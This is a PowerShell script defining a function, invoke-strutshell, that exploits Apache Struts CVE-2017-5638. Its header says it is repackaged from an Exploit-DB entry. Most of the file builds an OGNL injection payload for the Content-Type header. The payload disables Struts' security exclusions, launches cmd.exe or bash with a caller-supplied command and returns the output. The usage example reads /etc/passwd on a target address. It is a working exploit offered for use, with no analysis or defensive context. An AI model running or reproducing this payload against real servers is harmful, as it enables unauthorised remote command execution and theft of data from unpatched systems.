function invoke-strutshell {
<#
.SYNOPSIS
This is a scipt that will perform remote code execution on servers vulnerable to Apache Struts CVE-2017-5638. Exploit was pulled and re-packed into PowerShell using the Exploit from the Exploit-DB, https://www.exploit-db.com/exploits/41570/.
.DESCRIPTION
 ____  ____   __ __   ___   __  _    ___        _____ ______  ____  __ __  ______  _____ __ __    ___  _      _     
|    ||    \ |  |  | /   \ |  |/ ]  /  _]      / ___/|      ||    \|  |  ||      |/ ___/|  |  |  /  _]| |    | |    
 |  | |  _  ||  |  ||     ||  ' /  /  [_ _____(   \_ |      ||  D  )  |  ||      (   \_ |  |  | /  [_ | |    | |    
 |  | |  |  ||  |  ||  O  ||    \ |    _]     |\__  ||_|  |_||    /|  |  ||_|  |_|\__  ||  _  ||    _]| |___ | |___ 
 |  | |  |  ||  :  ||     ||     \|   [_|_____|/  \ |  |  |  |    \|  :  |  |  |  /  \ ||  |  ||   [_ |     ||     |
 |  | |  |  | \   / |     ||  .  ||     |      \    |  |  |  |  .  \     |  |  |  \    ||  |  ||     ||     ||     |
|____||__|__|  \_/   \___/ |__|\_||_____|       \___|  |__|  |__|\_|\__,_|  |__|   \___||__|__||_____||_____||_____

Locate a server running a vulnerable version of Apache Struts and then execute on that web application.

.EXAMPLE
invoke-strutshell -URL "http://10.0.100.250/struts2-showcase/index.action" -CMD "cat /etc/passwd"

.NOTES
All commands must containing spaces musted be enclosed in quotes. 

#>

param( $URL, $CMD )
# Now putting together the malicious content to insert into the content type
$payload = "%{(#_='multipart/form-data')."
$payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
$payload += "(#_memberAccess?"
$payload += "(#_memberAccess=#dm):"
$payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
$payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
$payload += "(#ognlUtil.getExcludedPackageNames().clear())."
$payload += "(#ognlUtil.getExcludedClasses().clear())."
$payload += "(#context.setMemberAccess(#dm))))."
$payload += "(#cmd='$CMD')."
$payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
$payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
$payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
$payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
$payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
$payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
$payload += "(#ros.flush())}"

# Now Executing the command on the remote server
$output = Invoke-RestMethod -Uri $URL -ContentType $payload -Method get -UseBasicParsing
$output

}